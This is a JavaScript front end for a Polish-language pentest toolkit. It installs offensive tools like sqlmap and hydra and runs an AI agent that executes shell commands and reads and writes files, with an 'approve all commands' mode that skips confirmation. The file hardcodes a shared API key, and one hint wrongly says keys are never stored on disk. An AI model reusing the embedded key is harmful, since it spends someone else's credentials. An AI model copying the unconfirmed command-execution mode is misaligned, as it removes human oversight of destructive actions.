  ["[ OK ] sandbox bezpieczny - brak sieci wylotowej", "dim"],
  ["[ OK ] konfiguracja UI", "dim"],
  ["[ OK ] backend Rust gotowy", ""],
];

(function boot() {
  const el = $("#boot"), log = $("#bootLog"), fill = $("#bootFill"), app = $("#app");
  let i = 0, done = false;

  const finish = () => {
    if (done) return;
    done = true;
    el.classList.add("gone");
    app.hidden = false;
    requestAnimationFrame(() => app.classList.add("ready"));
    setTimeout(() => el.remove(), 600);
  };

  const step = () => {
    if (done) return;
    if (i < BOOT_LINES.length) {
      const [text, cls] = BOOT_LINES[i++];
      log.innerHTML += `<span class="${cls}">${text}</span>\n`;
      fill.style.width = Math.round((i / (BOOT_LINES.length + 1)) * 100) + "%";
      setTimeout(step, 190);
    } else {
      fill.style.width = "100%";
      setTimeout(finish, 260);
    }
  };

  setTimeout(step, 260);
  addEventListener("keydown", (e) => { if (e.key === "Escape") finish(); });
  $("#boot").addEventListener("click", finish);
})();

/* ---------- START APLIKACJI ---------- */

let currentCat = "crypto";
let currentTool = null;

let aiReady = false;

function renderCards() {
  const cat = CATS[currentCat];
  $("#catTitle").textContent = cat.title;
  $("#catDesc").textContent = cat.desc;

  if (currentCat === "tools") {
    const wrap = $("#cards");
    wrap.classList.add("ai-host");
    wrap.innerHTML =
      '<div class="tools-wrap"><div class="tools-head" id="toolsHead">sprawdzam…</div>'
      + '<div class="tools-grid" id="toolsGrid"></div></div>';
    loadTools();
    return;
  }

  if (currentCat === "set") {
    const wrap = $("#cards");
    wrap.classList.add("ai-host");
    wrap.innerHTML = settingsShell();
    bindSettings();
    return;
  }

  if (currentCat === "ai") {
    const wrap = $("#cards");
    wrap.classList.add("ai-host");
    wrap.innerHTML = aiShell();
    if (!aiReady) { aiReady = true; initAi(); }
    $("#toolCount").textContent = TOOLS.length + " narzędzi";
    return;
  }
  $("#cards").classList.remove("ai-host");

  const list = TOOLS.filter((t) => t.cat === currentCat);
  const wrap = $("#cards");
  wrap.innerHTML = "";
  list.forEach((t, n) => {
    const b = document.createElement("button");
    b.className = "card";
    b.style.setProperty("--i", n);
    b.innerHTML =
      (t.tag ? `<span class="card-tag">${esc(t.tag)}</span>` : "") +
      `<span class="card-ico">${t.ico}</span>` +
      `<span class="card-name">${esc(t.name)}</span>` +
      `<span class="card-desc">${esc(t.desc)}</span>`;
    b.addEventListener("click", () => openTool(t.id));
    wrap.appendChild(b);
  });
  $("#toolCount").textContent = TOOLS.length + " narzędzi";
}

function fieldHtml(f) {
  const id = `f_${f.id}`;
  const cls = `field${f.wide ? " wide" : ""}`;
  if (f.hidden) return "";
  if (f.t === "select") {
    return `<div class="${cls}"><label>${esc(f.label)}</label><select id="${id}">` +
      f.opts.map((o, n) => `<option value="${esc(o)}"${o === f.value ? " selected" : ""}>${esc(f.labels?.[n] ?? o)}</option>`).join("") +
      `</select></div>`;
  }
  if (f.t === "textarea") {
    return `<div class="${cls}"><label>${esc(f.label)}</label><textarea id="${id}" rows="${f.rows || 4}" placeholder="${esc(f.ph || "")}">${esc(f.value || "")}</textarea></div>`;
  }
  if (f.t === "check") {
    return `<div class="${cls}"><label class="chk"><input type="checkbox" id="${id}"${f.value ? " checked" : ""}> ${esc(f.label)}</label></div>`;
  }
  const type = f.type ? ` type="${esc(f.type)}"` : "";
  return `<div class="${cls}"><label>${esc(f.label)}</label><input id="${id}"${type} value="${esc(f.value || "")}" placeholder="${esc(f.ph || "")}"></div>`;
}

function openTool(id) {
  const t = TOOLS.find((x) => x.id === id);
  if (!t) return;
  currentTool = t;

  $("#toolTitle").textContent = t.ico + "  " + t.name;
  $("#toolDesc").textContent = t.desc;
  $("#toolForm").innerHTML =
    `<div class="row">${t.fields.map(fieldHtml).join("")}</div>` +
    `<div class="btn-row"><button class="btn" id="runBtn">Uruchom</button></div>`;
  $("#toolOut").innerHTML = "";

  $("#gridView").hidden = true;
  $("#toolView").hidden = false;
  $("#toolView").scrollTop = 0;

  $("#runBtn").addEventListener("click", runTool);
  addEventListener("keydown", onEnter);
}

function back() {
  $("#toolView").hidden = true;
  $("#gridView").hidden = false;
  currentTool = null;
  removeEventListener("keydown", onEnter);
}

function onEnter(e) {
  if (e.key === "Enter" && (e.ctrlKey || e.metaKey)) {
    e.preventDefault();
    $("#runBtn")?.click();
  }
}

async function runTool() {
  const t = currentTool;
  if (!t) return;

  const btn = $("#runBtn");
  const label = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = `<span class="spin"></span>pracuję…`;

  const out = $("#toolOut");
  out.innerHTML = "";

  const args = {};
  for (const f of t.fields) {
    const el = $(`#f_${f.id}`);
    args[f.id] = f.t === "check" ? el.checked : el.value;
  }
  // mapuj argumenty na nazwy oczekiwane przez Rust
  const payload = {};
  t.args.forEach((name) => { payload[name] = args[name]; });
  if (t.id === "cidr_split") payload.newPrefix = parseInt(args.newPrefix, 10) || 24;

  // przełącznik komendy (np. szyfruj/odszyfruj)
  const cmd = (t.pre && t.pre[args._mode]) || t.cmd;

  // nagłówki HTTP: tekst -> obiekt dla serde
  if (t.id === "headers") {
    const map = {};
    String(args.raw || "").split("\n").forEach((line) => {
      const i = line.indexOf(":");
      if (i > 0) map[line.slice(0, i).trim()] = line.slice(i + 1).trim();
    });
    payload.headers = map;
    delete payload.raw;
  }

  try {
    if (!invoke) throw new Error("Brak mostka IPC — uruchom aplikację przez plik .exe");
    const r = await invoke(cmd, payload);
    if (r && r.error) {
      out.innerHTML = `<div class="err">⚠ ${esc(r.error)}</div>`;
    } else {
      out.innerHTML =
        `<div class="out-box">
           <div class="out-top"><span>wynik</span><button class="copy" id="copyBtn">kopiuj JSON</button></div>
           <div class="out-body">${t.out ? t.out(r) : pre(JSON.stringify(r, null, 2))}</div>
         </div>`;
      $("#copyBtn").addEventListener("click", () => {
        navigator.clipboard.writeText(JSON.stringify(r, null, 2))
          .then(() => flash("Skopiowano JSON do schowka"))
          .catch(() => flash("Schowek niedostępny"));
      });
    }
  } catch (e) {
    out.innerHTML = `<div class="err">⚠ ${esc(e?.message || e)}</div>`;
  } finally {
    btn.disabled = false;
    btn.innerHTML = label;
  }
}

let flashTimer;
function flash(msg) {
  let t = $("#flash");
  if (!t) {
    t = document.createElement("div");
    t.id = "flash";
    t.style.cssText = "position:fixed;right:22px;bottom:22px;padding:11px 18px;font-size:13px;" +
      "color:#04121a;background:var(--cyan);border-radius:10px;z-index:40;opacity:0;" +
      "transform:translateY(10px);transition:.25s cubic-bezier(.22,.9,.28,1);pointer-events:none;box-shadow:0 10px 30px rgba(0,0,0,.45)";
    document.body.appendChild(t);
  }
  t.textContent = msg;
  requestAnimationFrame(() => { t.style.opacity = "1"; t.style.transform = "none"; });
  clearTimeout(flashTimer);
  flashTimer = setTimeout(() => { t.style.opacity = "0"; t.style.transform = "translateY(10px)"; }, 1700);
}

/* ---------- nawigacja ---------- */

$("#tabs").addEventListener("click", (e) => {
  const b = e.target.closest(".tab");
  if (!b) return;
  currentCat = b.dataset.cat;
  $$(".tab").forEach((t) => t.classList.toggle("active", t === b));
  back();
  renderCards();
});

$("#backBtn").addEventListener("click", back);

/* ---------- autotest mostka JS <-> Rust ---------- */

(async function bridgeCheck() {
  const dot = $("#statusDot"), txt = $("#statusText");
  try {
    if (!invoke) throw new Error("brak IPC");
    const r = await invoke("hash_data", { text: "tznsec-selftest", algorithm: "sha256" });
    dot.className = "dot ok";
    txt.textContent = TOOLS.length + " narzędzi";
    document.title = "TZNSEC Toolkit ✓";
    if (!r.hash) throw new Error("pusta odpowiedź");
  } catch (e) {
    dot.className = "dot bad";
    txt.textContent = "brak backendu";
    document.title = "TZNSEC Toolkit ✗";
  }
})();

/* ---------- NARZEDZIA / INSTALATOR ---------- */

const TOOL_ICON = {
  nmap: "🗺️", masscan: "⚡", curl: "🌐", git: "📦", sqlmap: "💉",
  nikto: "🔎", hydra: "🔑", john: "🧨", hashcat: "⛏️", netcat: "🔌",
  python: "🐍", pip: "📥",
};

const TOOL_CAT = { atak: "Atak", siec: "Sieć", http: "HTTP", narzedzia: "Narzędzia" };

async function loadTools() {
  let s;
  try {
    s = await invoke("tools_status");
  } catch (e) {
    $("#toolsHead").textContent = "Błąd: " + (e?.message || e);
    return;
  }

  const inst = s.instalatory || {};
  $("#toolsHead").innerHTML =
    '<div class="tools-sum"><strong>' + s.zainstalowane + " / " + s.razem + "</strong> narzędzi zainstalowanych</div>"
    + '<div class="tags">'
    + (inst.winget ? '<span class="tag ok">winget dostępny</span>' : '<span class="tag no">brak winget</span>')
    + (inst.pip ? '<span class="tag ok">pip dostępny</span>' : '<span class="tag no">brak pip</span>')
    + "</div>";

  const grid = $("#toolsGrid");
  grid.innerHTML = "";
  (s.narzedzia || []).forEach((t) => {
    const has = t.zainstalowane;
    const el = document.createElement("div");
    el.className = "tool-card" + (has ? " ok" : "");
    el.innerHTML =
      '<div class="tc-top"><span class="tc-ico">' + (TOOL_ICON[t.id] || "🔧") + "</span>"
      + '<span class="tc-cat">' + esc(TOOL_CAT[t.kategoria] || t.kategoria) + "</span></div>"
      + '<div class="tc-name">' + esc(t.nazwa) + "</div>"
      + '<div class="tc-desc">' + esc(t.opis) + "</div>"
      + (has
          ? '<div class="tc-ok">✓ zainstalowane</div>'
          : (t.metoda
              ? '<button class="btn small" data-inst="' + esc(t.id) + '">Zainstaluj (' + t.metoda + ")</button>"
              : '<div class="tc-none">brak instalatora</div>'));
    grid.appendChild(el);
  });

  grid.querySelectorAll("[data-inst]").forEach((b) =>
    b.addEventListener("click", () => doInstall(b.dataset.inst, b)));
}

async function doInstall(id, btn) {
  const old = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<span class="spin"></span>instaluję…';
  try {
    const r = await invoke("tool_install", { id: id });
    if (r.error) {
      flash(r.error);
      btn.innerHTML = "błąd";
    } else if (r.zainstalowane) {
      flash(r.narzedzie + " zainstalowane");
      await loadTools();
      return;
    } else {
      btn.innerHTML = "nie powiodło się";
    }
  } catch (e) {
    flash("Błąd: " + (e?.message || e));
    btn.innerHTML = old;
  }
  setTimeout(() => { btn.disabled = false; btn.innerHTML = old; }, 2500);
}

/* ---------- USTAWIENIA ---------- */

let CFG = null;

function settingsShell() {
  return `
  <div class="set-wrap">
    <div class="set-card">
      <h3>Asystent AI</h3>
      <div class="row">
        <div class="field"><label>Dostawca</label><select id="sProv"></select></div>
        <div class="field"><label>Model</label><input id="sModel" placeholder="nazwa modelu" /></div>
      </div>
      <div class="field">
        <label>Klucz API</label>
        <input type="password" id="sKey" placeholder="wklej klucz" autocomplete="off" />
      </div>
      <label class="chk"><input type="checkbox" id="sRemember" /> Zapamiętaj klucz na dysku (szyfrowany AES)</label>
      <p class="hint" id="sKeyInfo"></p>
      <div class="btn-row">
        <button class="btn" id="sSaveKey">Zapisz klucz</button>
        <button class="btn ghost" id="sForgetKey">Usuń zapisany klucz</button>
      </div>
    </div>

    <div class="set-card">
      <h3>Uprawnienia agenta</h3>
      <label class="chk"><input type="checkbox" id="sAuto" /> Autozatwierdzanie komend niskiego ryzyka</label>
      <label class="chk"><input type="checkbox" id="sBoot" /> Pokazuj animację startową</label>
      <label class="chk"><input type="checkbox" id="sAnim" /> Animacje interfejsu</label>
      <div class="field" style="margin-top:14px">
        <label>Limit czasu komendy (sekundy)</label>
        <input type="number" id="sTimeout" min="1" max="600" value="60" />
      </div>
      <p class="hint">Komendy średniego i wysokiego ryzyka zawsze wymagają kliknięcia, niezależnie od tego ustawienia.</p>
    </div>

    <div class="set-card">
      <h3>Dane prywatne</h3>
      <label class="chk"><input type="checkbox" id="sClear" /> Czyść schowek przy zamknięciu</label>
      <p class="hint">Plik ustawień: <code id="sPath"></code></p>
      <div class="btn-row">
        <button class="btn ghost" id="sReset">Przywróć ustawienia domyślne</button>
      </div>
    </div>
  </div>`;
}

async function bindSettings() {
  try { CFG = await invoke("settings_load"); } catch { CFG = null; }
  const c = CFG || { ai: {}, ui: {}, privacy: {} };
  const ai = c.ai || {}, ui = c.ui || {}, pv = c.privacy || {};

  let provs = [];
  try { provs = (await invoke("ai_providers")) || []; } catch {}
  $("#sProv").innerHTML = provs
    .map((p) => `<option value="${esc(p.id)}">${esc(p.nazwa)}</option>`).join("");
  $("#sProv").value = ai.provider || "xkiro";

  const onProv = () => {
    const p = provs.find((x) => x.id === $("#sProv").value);
    $("#sModel").value = p && p.modele && p.modele.length ? p.modele[0] : (ai.model || "");
    $("#sKeyInfo").textContent = p ? p.uwaga : "";
    // klucz wspolnotowy wklejony w kod - pokazujemy, ze jest dostepny
    if (p && AI_PREFILL[p.id] && !$("#sKey").value) $("#sKey").value = AI_PREFILL[p.id];
  };
  onProv();
  $("#sProv").addEventListener("change", onProv);

  $("#sModel").value = ai.model || "";
  $("#sRemember").checked = !!ai.remember_key;
  $("#sAuto").checked = !!ai.auto_approve_low_risk;
  $("#sTimeout").value = ai.command_timeout || 60;
  $("#sBoot").checked = ui.boot !== false;
  $("#sAnim").checked = ui.animations !== false;
  $("#sClear").checked = pv.clear_on_exit !== false;
  $("#sPath").textContent = c._sciezka || "-";
  if (ai.key_stored_for && ai.key_stored_for.length) {
    $("#sKeyInfo").textContent = "Zapisany klucz dla: " + ai.key_stored_for.join(", ");
  }

  $("#sSaveKey").addEventListener("click", async () => {
    const prov = $("#sProv").value;
    const key = $("#sKey").value.trim();
    try {
      if ($("#sRemember").checked) {
        await invoke("settings_set_key", { provider: prov, key: key });
        flash("Klucz zapisany (szyfrowany)");
      } else {
        await invoke("settings_set_key", { provider: prov, key: "" });
        await invoke("settings_save", { patch: { ai: { remember_key: false } } });
        flash("Klucz użyty tylko w tej sesji");
      }
      await applySettings();
      bindSettings();
    } catch (e) { flash("Błąd: " + (e?.message || e)); }
  });

  $("#sForgetKey").addEventListener("click", async () => {
    try {
      await invoke("settings_forget_key", { provider: $("#sProv").value });
      $("#sKey").value = "";
      await applySettings();
      flash("Klucz usunięty");
      bindSettings();
    } catch (e) { flash("Błąd: " + (e?.message || e)); }
  });

  $("#sReset").addEventListener("click", async () => {
    try {
      await invoke("settings_reset");
      await applySettings();
      flash("Ustawienia przywrócone");
      renderCards();
    } catch (e) { flash("Błąd: " + (e?.message || e)); }
  });

  ["sAuto", "sBoot", "sAnim", "sRemember", "sClear"].forEach((id) =>
    $("#" + id).addEventListener("change", () => saveSettings()));
  $("#sTimeout").addEventListener("change", () => saveSettings());
  $("#sModel").addEventListener("change", () => saveSettings());
  $("#sProv").addEventListener("change", () => saveSettings());
}

async function saveSettings() {
  const patch = {
    ai: {
      provider: $("#sProv")?.value,
      model: $("#sModel")?.value,
      remember_key: $("#sRemember")?.checked,
      auto_approve_low_risk: $("#sAuto")?.checked,
      command_timeout: parseInt($("#sTimeout")?.value, 10) || 60,
    },
    ui: { boot: $("#sBoot")?.checked, animations: $("#sAnim")?.checked },
    privacy: { clear_on_exit: $("#sClear")?.checked },
  };
  try {
    CFG = await invoke("settings_save", { patch: patch });
    applySettings();
  } catch {}
}

async function applySettings() {
  const c = CFG || {};
  const ai = c.ai || {};
  AI.autoApprove = !!ai.auto_approve_low_risk;
  AI.timeout = ai.command_timeout || 60;
  AI.base = ai.base || AI.base;
  if (ai.model) AI.model = ai.model;
  document.body.classList.toggle("no-anim", c.ui && c.ui.animations === false);
}

/* ---------- czat AI ---------- */

const AI = { providers: [], base: "", model: "", history: [], context: "", busy: false, approveAll: false };

/* Wbudowany klucz wspolnotowy - dziala od razu po instalacji.
   UWAGA: jest publiczny, wiec dzieli limity darmowego planu miedzy wszystkimi
   uzytkownikami. Gdy przestanie dzialac, w Ustawieniach mozna wkleic wlasny klucz
   albo przelaczyc sie na Ollama / LM Studio (lokalne, bez limitow). */
const AI_PREFILL = {
  xkiro: "sk-xt-dba423731dbc63d16e486ce02bf91dc58d61e0a043e77855",
};

/* wyniki ostatniego uruchomienia narzedzi - wplatane z powrotem do rozmowy */
let agentResults = [];
let toolsRanThisTurn = false;

function aiShell() {
  return `
  <div class="ai-wrap">
    <aside class="ai-side">
      <label>Dostawca</label>
      <select id="aiProv"></select>
      <label>Model</label>
      <select id="aiModel"></select>
      <label>Klucz API</label>
      <input type="password" id="aiKey" placeholder="wklej swoj klucz" autocomplete="off" />
      <p class="hint" id="aiKeyNote"></p>
      <p class="hint" id="aiSharedNote" hidden>
        Wbudowany klucz wspólnotowy działa od razu, ale dzieli limity darmowego planu
        między wszystkich użytkowników. Gdy się wyczerpie, wybierz Ollama lub LM Studio
        w zakładce <b>Narzędzia</b> — działają lokalnie, bez limitów i bez klucza.
        Własny klucz wkleisz w <b>Ustawieniach</b>.
      </p>
      <div id="aiCustomBox" hidden>
        <label>Adres endpointu</label>
        <input id="aiBase" placeholder="https://api.twojeprovider.com/v1" />
        <label>Nazwa modelu</label>
        <input id="aiModelName" placeholder="np. qwen2.5-coder:7b" />
      </div>
      <button class="btn ghost" id="aiClear" style="width:100%;margin-top:10px">Wyczysc rozmowe</button>
      <p class="hint" style="margin-top:14px">
        Klucz jest trzymany wylacznie w pamieci tej sesji i wysylany tylko do wybranego
        dostawcy. Nie jest zapisywany na dysku ani nigdzie logowany.
      </p>
    </aside>
    <div class="ai-main">
      <div class="ai-perm" id="aiPerm">
        <label class="chk"><input type="checkbox" id="aiAuto" /> Zatwierdzaj automatycznie komendy niskiego ryzyka (odczyt, skanowanie)</label>
        <label class="chk danger"><input type="checkbox" id="aiAll" /> <b>Zatwierdzaj WSZYSTKIE komendy automatycznie</b></label>
        <p class="hint warn" id="aiAllWarn" hidden>
          Tryb bez pytania. AI uruchomi wszystko, co zaproponuje — łącznie z komendami
          kasującymi pliki, instalującymi pakietami i zmieniającymi konfigurację systemu.
          Włączaj tylko przy testach na własnym środowisku.
        </p>
        <p class="hint" id="aiWs"></p>
      </div>
      <div class="ai-quick">
        <span class="hint">Szybkie pytania:</span>
        <button class="qbtn" data-q="Zaplanuj bezpieczny pentest localhost:8080. Od czego zaczac?">Start pentestu</button>
        <button class="qbtn" data-q="Jak skonfigurowac rate limiting, zeby usluga nie padla pod obciazeniem?">Rate limiting</button>
        <button class="qbtn" data-q="Wyjasnij wynik audytu naglowkow HTTP i jakie naglowki dodac.">Naglowki HTTP</button>
        <button class="qbtn" data-q="Jak rozpoznac SQL injection w logach i jak to naprawic?">SQLi w logach</button>
        <button class="qbtn" data-q="Jak bezpiecznie zaszyfrowac plik haslem na Windows?">Szyfrowanie pliku</button>
      </div>
      <div class="ai-log" id="aiLog"></div>
      <div class="ai-input">
        <textarea id="aiText" rows="2" placeholder="Opisz cel, zakres i objawy... (Enter = wyslij, Shift+Enter = nowa linia)"></textarea>
        <button class="btn" id="aiSend">Wyslij</button>
      </div>
    </div>
  </div>`;
}

/* ---------- karty akcji z potwierdzeniem ---------- */

/* Czy model twierdzi, że coś wykonał, choć nic nie uruchamiał.
   Wzorce celowo szerokie - chodzi o wyłapanie obietnicy bez dowodu. */
const CLAIM_PATTERNS = [
  /przeskanował(em|am)/i, /skanował(em|am)/i, /sprawdziłem/i, /sprawdziłem(em|am)/i,
  /wykryłem/i, /znalazłem/i, /znalazłem(em|am)/i, /przetestował(em|am)/i,
  /uruchomiłem/i, /wykonałem/i, /próbował(em|am)/i, /sprawdziłem na/i,
  /i found/i, /i scanned/i, /i tested/i, /i checked/i, /i ran/i, /i verified/i,
  /wyniki skanowania/i, /po skanowaniu/i, /test wykazał/i, /potwierdziłem/i,
];

function hasUnverifiedClaim(text, toolsRan) {
  if (toolsRan) return false;
  return CLAIM_PATTERNS.some((re) => re.test(text || ""));
}

/* Wynik komendy: na wierzchu analiza, surowy output w zwijanym bloku.
   Zero smieci z terminala na ekranie. */
function aiResultBlock(title, cmd, rawOut, exitCode, analysis) {
  const el = document.createElement("div");
  el.className = "res";

  const head = document.createElement("div");
  head.className = "res-head";
  head.innerHTML =
    '<span class="tag ' + (exitCode === 0 ? "ok" : "mid") + '">' + esc(title) + "</span>"
    + '<span class="res-cmd"></span>';
  head.querySelector(".res-cmd").textContent = cmd || "";
  el.appendChild(head);

  if (analysis && analysis.length) {
    const box = document.createElement("div");
    box.className = "res-findings";
    box.innerHTML = analysis
      .map((a) => '<div class="find ' + esc(a.poziom || "info") + '">'
        + '<b>' + esc(a.znalezisko) + "</b>"
        + (a.detal ? "<br><span>" + esc(a.detal) + "</span>" : "")
        + "</div>")
      .join("");
    el.appendChild(box);
  } else {
    const ok = document.createElement("div");
    ok.className = "res-clean";
    ok.textContent = "wykonano, brak rozpoznanych sygnałów";
    el.appendChild(ok);
  }

  // surowy output - zwijany, domyslnie zamkniety
  const det = document.createElement("details");
  det.className = "res-raw";
  const sum = document.createElement("summary");
  sum.textContent = "dane techniczne (" + (rawOut || "").length + " znaków)";
  det.appendChild(sum);
  const pre = document.createElement("pre");
  pre.textContent = rawOut || "";
  det.appendChild(pre);
  el.appendChild(det);

  $("#aiLog").appendChild(el);
  $("#aiLog").scrollTop = $("#aiLog").scrollHeight;
  return el;
}

/* Wbudowany klucz wspolnotowy dziala na darmowym planie, ktory ma limity.
   Gdy zostana wyczerpane przez wielu uzytkownikow, podpowiedz lokalna alternatywe. */
function explainApiError(msg) {
  const m = String(msg || "").toLowerCase();
  if (/429|rate.?limit|quota|too many|resource_exhausted|przekrocz/.test(m)) {
    return msg + "\n\nWspolny klucz darmowego planu jest wyczerpany — to ograniczenie konta, " +
      "nie blad aplikacji. Uzyj Ollama albo LM Studio (zakladka Narzedzia, instalacja jednym kliknieciem): " +
      "dzialaja lokalnie, bez limitow i bez klucza. Wlasny klucz wkleisz w Ustawieniach.";
  }
  if (/401|403|unauthorized|permission|forbidden/.test(m)) {
    return msg + "\n\nKlucz zostal odrzucony. Wpisz wlasny klucz w Ustawieniach " +
      "albo przelacz sie na Ollama / LM Studio (lokalne, bez klucza).";
  }
  return msg;
}

async function runCommand(cmd, title) {
  const wait = aiBubble("ai", "wykonuję: " + (cmd || "").slice(0, 120) + "…");
  try {
    const r = await invoke("agent_exec", {
      command: cmd,
      timeoutSecs: String(AI.timeout || 60),
    });
    wait.remove();

    const raw = "exit=" + r.exit_code + "\n" + (r.stdout || "") + (r.stderr ? "\n[błąd] " + r.stderr : "");

    let sig = [];
    let summary = "";
    try {
      const a = await invoke("recon_analyze", {
        command: cmd || "",
        stdout: r.stdout || "",
        stderr: r.stderr || "",
        exitCode: r.exit_code,
      });
      sig = a.sygnaly || [];
      summary = a.podsumowanie || "";
    } catch {}

    aiResultBlock(title, cmd, raw, r.exit_code, sig);

    const dlaAI =
      "WYNIK " + title + " (exit=" + r.exit_code + ")\n"
      + "--- surowe wyjscie (skrocone) ---\n"
      + raw.slice(0, 3000)
      + (sig.length
          ? "\n--- automatyczna analiza ---\n"
            + sig.map((s) => "[" + s.poziom + "] " + s.znalezisko + " :: " + (s.detal || "")).join("\n")
            + "\nwniosek: " + summary
          : "\n--- analiza: brak rozpoznanych sygnalow ---");
    return dlaAI;
  } catch (e) {
    wait.remove();
    const m = (e && e.message) || String(e);
    aiBubble("err", m);
    return "[BŁĄD] " + m;
  }
}

async function renderCalls(calls) {
  for (const c of calls) {
    const a = c.args || {};
    let title = "";
    let preview = "";

    if (c.tool === "run_command") {
      title = "Uruchomić komendę";
      preview = a.command || "";
      const risk = await invoke("agent_classify", { command: a.command || "" });
      if (AI.approveAll) {
        agentResults.push(await runCommand(a.command, title));
        continue;
      }
      const card = await aiActionCard(
        title, preview, risk.level === "high" ? "no" : risk.level === "medium" ? "mid" : "ok",
        risk.level === "low" ? "" : "Ryzyko: " + (risk.level === "high" ? "WYSOKIE" : "średnie") + " — " + (risk.powod || ""),
        () => runCommand(a.command, title)
      );
      if (card && risk.level === "low" && AI.autoApprove) card.click();
    } else if (c.tool === "write_file") {
      title = "Zapisać plik";
      preview = a.path + "  (" + (a.content || "").length + " znaków)\n" + String(a.content || "").slice(0, 300);
      if (AI.approveAll) {
        const r = await invoke("agent_write_file", { path: a.path, content: a.content || "" });
        agentResults.push(r.error ? "[zapis BŁĄD] " + r.error : "[zapis OK] " + r.sciezka);
        continue;
      }
      const card = await aiActionCard(title, preview, "mid", "Zapis w katalogu roboczym", async () => {
        const r = await invoke("agent_write_file", { path: a.path, content: a.content || "" });
        return r.error ? "BŁĄD: " + r.error : "Zapisano: " + r.sciezka + " (" + r.bajty + " B)";
      });
      if (card && AI.autoApprove) card.click();
    } else if (c.tool === "read_file") {
      title = "Odczytać plik";
      preview = a.path;
      if (AI.approveAll) {
        const r = await invoke("agent_read_file", { path: a.path });
        agentResults.push(r.error ? "[odczyt BŁĄD] " + r.error : r.tresc || "(pusty)");
        continue;
      }
      const card = await aiActionCard(title, preview, "ok", "Odczyt", async () => {
        const r = await invoke("agent_read_file", { path: a.path });
        return r.error ? "BŁĄD: " + r.error : r.tresc || "(pusty)";
      });
      if (card && AI.autoApprove) card.click();
    } else if (c.tool === "list_dir") {
      title = "Wylistować katalog";
      preview = a.path || "(katalog roboczy)";
      if (AI.approveAll) {
        const r = await invoke("agent_list_dir", { path: a.path || "" });
        agentResults.push(r.error ? "[lista BŁĄD] " + r.error
          : (r.elementy || []).map((e) => e.katalog ? "[k] " + e.nazwa : "    " + e.nazwa).join("\n"));
        continue;
      }
      const card = await aiActionCard(title, preview, "ok", "Odczyt", async () => {
        const r = await invoke("agent_list_dir", { path: a.path || "" });
        if (r.error) return "BŁĄD: " + r.error;
        return (r.elementy || []).map((e) => e.katalog ? "[k] " : "    " + e.nazwa).join("\n");
      });
      if (card && AI.autoApprove) card.click();
    }
  }
}

/* Zwraca promise + element (klikalny = auto-zatwierdzenie) */
function aiActionCard(title, body, tone, note, run) {
  return new Promise((resolve) => {
    const el = document.createElement("div");
    el.className = "act";
    el.innerHTML =
      '<div class="act-top"><span class="tag ' + tone + '">' + esc(title) + '</span></div>' +
      '<pre class="act-body"></pre>' +
      (note ? '<p class="hint">' + esc(note) + '</p>' : '') +
      '<div class="act-btns">' +
      '<button class="btn ok">Wykonaj</button>' +
      '<button class="btn ghost">Odrzuć</button>' +
      '</div>';
    el.querySelector(".act-body").textContent = body || "";
    $("#aiLog").appendChild(el);
    $("#aiLog").scrollTop = $("#aiLog").scrollHeight;

    const done = (txt, rejected) => {
      el.remove();
      agentResults.push(txt);
      resolve(el);
    };
    el.querySelector(".ghost").addEventListener("click", () => {
      agentResults.push("[Użytkownik ODRZUCIŁ akcję: " + title + " — " + (body || "").slice(0, 200) + "]");
      el.remove();
      resolve(null);
    });
    el.querySelector(".ok").addEventListener("click", async () => {
      el.remove();
      const wait = aiBubble("ai", "wykonuję: " + title + "…");
      try {
        const out = await run();
        wait.remove();
        aiBubble("ai", out);
        agentResults.push("[" + title + " OK]\n" + out);
      } catch (e) {
        wait.remove();
        aiBubble("err", (e && e.message) || String(e));
        agentResults.push("[" + title + " BŁĄD] " + ((e && e.message) || e));
      }
      resolve(el);
    });
    resolve(el);
  });
}

function aiBubble(role, text) {
  const d = document.createElement("div");
  d.className = "msg " + role;
  d.textContent = text;
  const log = $("#aiLog");
  log.appendChild(d);
  log.scrollTop = log.scrollHeight;
  return d;
}

function aiFillModels() {
  const p = AI.providers.find((x) => x.id === $("#aiProv").value);
  AI.base = p ? p.base : "";
  const m = $("#aiModel");
  if (p && p.modele && p.modele.length) {
    m.innerHTML = p.modele.map((x) => `<option value="${esc(x)}">${esc(x)}</option>`).join("");
    AI.model = p.modele[0];
  } else {
    m.innerHTML = `<option value="">wpisz nazwe modelu</option>`;
    AI.model = "";
  }
}

function aiProviderChanged() {
  aiFillModels();
  const p = AI.providers.find((x) => x.id === $("#aiProv").value);
  const custom = !p || p.id === "custom";
  if (p && AI_PREFILL[p.id] && !$("#aiKey").value) $("#aiKey").value = AI_PREFILL[p.id];
  $("#aiCustomBox").hidden = !custom;
  $("#aiModel").style.display = custom ? "none" : "";
  $("#aiKey").style.display = p && p.klucz ? "" : "none";
  $("#aiKeyNote").textContent = p ? p.uwaga : "";
  $("#aiSharedNote").hidden = !(p && AI_PREFILL[p.id]);
}

async function initAi() {
  try {
    AI.providers = (await invoke("ai_providers")) || [];
  } catch {
    AI.providers = [];
  }
  const sel = $("#aiProv");
  sel.innerHTML = AI.providers.map((p) => `<option value="${esc(p.id)}">${esc(p.nazwa)}</option>`).join("");
  aiProviderChanged();
  sel.addEventListener("change", aiProviderChanged);
  $("#aiModel").addEventListener("change", () => { AI.model = $("#aiModel").value; });
  $("#aiSend").addEventListener("click", aiSend);
  $("#aiClear").addEventListener("click", () => {
    AI.history = [];
    $("#aiLog").innerHTML = "";
    aiBubble("ai", "Rozmowa wyczyszczona. W czym moge pomoc?");
  });
  $("#aiText").addEventListener("keydown", (e) => {
    if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); aiSend(); }
  });
  document.querySelectorAll(".qbtn").forEach((b) =>
    b.addEventListener("click", () => { $("#aiText").value = b.dataset.q; aiSend(); })
  );
  $("#aiAuto").addEventListener("change", (e) => {
    AI.autoApprove = e.target.checked;
    if (e.target.checked) {
      $("#aiAll").checked = false;
      AI.approveAll = false;
      $("#aiAllWarn").hidden = true;
    }
  });
  $("#aiAll").addEventListener("change", (e) => {
    AI.approveAll = e.target.checked;
    $("#aiAllWarn").hidden = !e.target.checked;
    if (e.target.checked) {
      $("#aiAuto").checked = false;
      AI.autoApprove = false;
    }
  });
  try {
    const w = await invoke("agent_workspace");
    $("#aiWs").textContent = "Katalog roboczy: " + w.sciezka;
  } catch {}
  if (AI.approveAll) { $("#aiAll").checked = true; $("#aiAllWarn").hidden = false; }
  aiBubble("ai", "Czesc. Jestem asystentem bezpieczenstwa TZNSEC. Pomagam w autoryzowanym " +
    "pentestie Twoich wlasnych systemow (localhost, LAN, Tailscale). Co testujemy?");
}

async function aiSend() {
  if (AI.busy) return;
